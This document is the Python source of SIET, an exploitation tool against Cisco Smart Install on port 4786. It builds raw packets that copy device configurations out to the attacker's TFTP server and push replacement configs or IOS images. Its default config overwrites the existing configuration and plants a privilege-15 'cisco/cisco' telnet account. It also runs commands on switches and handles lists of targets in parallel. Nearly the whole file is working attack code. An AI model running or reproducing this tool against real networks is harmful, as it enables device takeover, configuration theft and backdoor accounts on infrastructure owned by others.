#!/usr/bin/python
# SMART INSTALL EXPLOITATION TOOL(SIET)

import argparse
import socket
import os
import shutil
import ntpath
import sys
import subprocess
import time
import threading
import Queue


def get_argm_from_user():  # Set arguments for running
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="IP", help="Set ip-address of client")
    parser.add_argument("-l", "--list_ip", dest="list_IP", help="Set file with list of target IP")
    parser.add_argument("-t", "--test", dest="mode", const="test", action="store_const",
                        help="Only test for smart install")
    parser.add_argument("-g", "--get_config", dest="mode", const="get_config", action="store_const",
                        help="Get cisco configuration file from device and store it in conf/ directory")
    parser.add_argument("-c", "--change_config", dest="mode", const="change_config", action="store_const",
                        help="Install a new configuration file to the remote device")
    parser.add_argument("-u", "--update_ios", dest="mode", const="update_ios", action="store_const",
                        help="Updating IOS on the remote device")
    parser.add_argument("-e", "--execute", dest="mode", const="execute", action="store_const",
                        help="Execute code on device (new IOS versions: 3.6.0E+ & 15.2(2)E+")
    args = parser.parse_args()
    return args


def get_time_from_user():  # Time setting before device reload and apply your configuration file

    while True:
        tt = raw_input('[INPUT]: Please enter timeout before reload [HH:MM]:')
        sHH = tt[0:2]
        sMM = tt[3:5]
        if ((sHH + sMM).isdigit() == 0) or (int(sHH) > 23) or (int(sMM) > 60) or (':' not in tt):
            print('[ERROR]: Invalid time!')
            continue
        break
    return tt[0:5]


def get_file_for_tftp(mode): # Creating directories, configuration files and execute files

    ask_file = raw_input(
        '[INPUT]: Enter full cisco configuration/execute file path, or press "d" for default (be attention here, default file destroy previous configuration): ')

    if ask_file == 'd':

        args = get_argm_from_user()
        try:

            cUser = raw_input('[INPUT]: Enter username or press enter for "cisco": ') or 'cisco'
            cPass = raw_input('[INPUT]: Enter password or press enter for "cisco": ') or 'cisco'

            if mode == 'config':
                f = open('tftp' + '/' + 'default.conf', 'wb')
                f.write('username ' + cUser + ' privilege 15 secret 0 ' + cPass + '\n' +
                        'interface Vlan1\n ip address ' + args.IP + ' ' + '255.255.255.0' + '\n no shutdown\n' +
                        'line vty 0 4\n login local\n transport input telnet\nend\n')
                f.close()
                nfile = 'default.conf'

            elif mode == 'execute':
                f = open('tftp' + '/' + 'execute.txt', 'wb')
                f.write('"username ' + cUser + ' privilege 15 secret 0 ' + cPass + '"' + ' "exit"')
                f.close()
                nfile = 'execute.txt'

        except (IOError, OSError) as why:
            print str(why)
            print('[ERROR]: Check the file and try again.')
            exit()

    else:
        try:
            if mode == 'config':
                shutil.copy2(str(ask_file), 'tftp/my.conf')
                nfile = 'my.conf'

            elif mode == 'execute':
                shutil.copy2(str(ask_file), 'tftp/my_exec.txt')
                nfile = 'my_exec.txt'

        except (IOError, OSError) as why:
            print str(why)
            print('[ERROR]: Check the file and try again.')
            exit()

    print('[INFO]: File created: ' + nfile)
    return nfile


def get_ios_for_tftp():  # Creating nessesary files for IOS update

    try:
        ios_image = raw_input('[INPUT]: Enter canonical path for the cisco IOS image(tar) file: ')
        shutil.copy2(str(ios_image), 'tftp/')
        ios_image_name = ntpath.basename(ios_image)
        if os.path.exists('tftp/tar_imglist0.txt'):
            os.remove('tftp/tar_imglist0.txt')
        f = open('tftp' + '/' + 'tar_imglist0.txt', 'wb')
        f.write(str(ios_image_name))
        f.close()

    except (IOError, OSError) as why:
        print str(why)
        print('[ERROR]: Check the file and try again.')
        exit()


def conn_with_client(data, ip, mode=0):  # Set connection with remote client

    args = get_argm_from_user()

    try:
        conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn_with_host.settimeout(5)
        conn_with_host.connect((ip, 4786))
        my_ip = (conn_with_host.getsockname()[0])

        if data:
            conn_with_host.send(data)

            if mode == 0:
                conn_with_host.close()
                print('[INFO]: Package send success to %s: ' % ip)

            elif mode == 1:
                resp = '0' * 7 + '4' + '0' * 8 + '0' * 7 + '3' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8

                while True:

                    data = conn_with_host.recv(512)

                    if (len(data) < 1):
                        print('[INFO]: Smart Install Director feature active on {0}'.format(ip))
                        print('[INFO]: {0} is not affected'.format(ip))
                        break
                    elif (len(data) == 24):
                        if (data.encode('hex') == resp):
                            print('[INFO]: Smart Install Client feature active on {0}'.format(ip))
                            print('[INFO]: {0} is affected'.format(ip))
                            break
                        else:
                            print(
                            '[ERROR]: Unexpected response received, Smart Install Client feature might be active on {0}'.format(
                                ip))
                            print('[INFO]: Unclear whether {0} is affected or not'.format(ip))
                            break
                    else:
                        print(
                        '[ERROR]: Unexpected response received, Smart Install Client feature might be active on {0}'.format(
                            ip))
                        print('[INFO]: Unclear whether {0} is affected or not'.format(ip))
                        break

                conn_with_host.close()

        return my_ip

    except KeyboardInterrupt:
        print('[INFO]: You pressed Ctrl+C, exit.')
        exit()

    except socket.gaierror:
        print('[ERROR]: Hostname could not be resolved, exit.')
        exit()

    except socket.error:
        if args.IP:
            print("[ERROR]: Couldn't connect to %s, exit." % ip)
            exit()
        elif args.list_IP:
            print("[ERROR]: Couldn't connect to %s, next." % ip)
            pass


def test_device(current_ip): # Testing for smart install

    sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '4' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8

    # print('[DEBUG]: Packet for sent: ' + sTcp)
    print('[INFO]: Sending TCP packet to %s ' % current_ip)
    # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
    conn_with_client(sTcp.decode('hex'), current_ip, mode=1)


def change_tftp(mode, current_ip):  # Send package for changing tftp address

    my_ip = conn_with_client(None, current_ip)

    if not my_ip:
        my_ip = socket.gethostbyname(socket.gethostname())

    if mode == 'change_config':
        config_file = get_file_for_tftp('config')
        fConf = 'tftp://' + my_ip + '/' + config_file
        sTime = get_time_from_user()

        sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
        sDump2 = '0' * (264 - len(fConf) * 2)
        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
            'hex') + sDump2

    elif mode == 'get_config':
        # need more test with this payload ( "system:" may be more usefull then "nvram:"
        # c1 = 'copy nvram:startup-config flash:/config.text'
        # c2 = 'copy nvram:startup-config tftp://' + my_ip + '/' + current_ip + '.conf'
        c1 = 'copy system:running-config flash:/config.text'
        c2 = 'copy flash:/config.text tftp://' + my_ip + '/' + current_ip + '.conf'
        c3 = ''

        sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'

        sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
        sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
        sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))

    elif mode == 'update_ios':
        get_ios_for_tftp()
        sTime = get_time_from_user()
        fList = 'tftp://' + my_ip + '/tar_imglist0.txt'

        sTcp = '%08x' % 1 + '%08x' % 1 + '%08x' % 2 + '%08x' % 0x1c4 + '%08x' % 2
        if sTime == '00:00':
            sTcp += '%08x' % 0x821 + '%024x' % 1 + '%032x' % 1
        else:
            sTcp += '%08x' % 0x801 + '%024x' % 0 + '%08x' % 1 + '%08x' % int(sTime[0:2]) + '%08x' % int(
                sTime[3:5]) + '%08x' % 1
        sTcp += fList.encode('hex') + '00' * (415 - len(fList)) + '01'

    elif mode == 'execute':
        exec_file = get_file_for_tftp('execute')

        c1 = ''
        c2 = ''
        c3 = 'tftp://' + my_ip + '/' + exec_file

        sTcp = '%08d' % 2 + '%08d' % 1 + '%08d' % 5 + '%08d' % 210 + '%08d' % 1
        sTcp = sTcp + c1.encode('hex') + '00' * (128 - len(c1))
        sTcp = sTcp + c2.encode('hex') + '00' * (264 - len(c2))
        sTcp = sTcp + c3.encode('hex') + '00' * (131 - len(c3)) + '01'

    # print('[DEBUG]: Packet for sent: ' + sTcp)
    print('[INFO]: Sending TCP packet to %s ' % current_ip)
    # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
    conn_with_client(sTcp.decode('hex'), current_ip)


def main():
    args = get_argm_from_user()

    if args.mode == 'test':
        current_ip = args.IP
        test_device(current_ip)

    else:
        tftp = subprocess.Popen(["python", "sTFTP.py"])

        if args.mode != 'get_config':
            current_ip = args.IP
            change_tftp(args.mode, current_ip)

        elif args.mode == 'get_config':
            if args.IP:
                current_ip = args.IP
                change_tftp(args.mode, current_ip)

            elif args.list_IP:
                try:

                    def worker():
                        while True:
                            ip = q.get()
                            change_tftp(args.mode, ip)
                            q.task_done()

                    q = Queue.Queue()

                    with open(args.list_IP, 'r') as list:
                        for line in list:
                            ip = line.strip()
                            q.put(ip)

                    for i in range(50):
                        t = threading.Thread(target=worker)
                        t.daemon = True
                        t.start()

                    q.join()

                except (IOError, OSError) as why:
                    print str(why)
                    print('[ERROR]: Check the file and try again.')
                    exit()

                except TypeError:
                    pass

                except KeyboardInterrupt:
                    print('[INFO]: You pressed Ctrl+C, exit.')
                    exit()

            print('[INFO]: Getting config done')

        else:
            print('[ERROR]: Choose the tool mode (test/get_config/change_config/update_ios/execute)')

        print('[INFO]: All done! Waiting 60 seconds for end of connections...')
        time.sleep(60)
        tftp.terminate()


main()
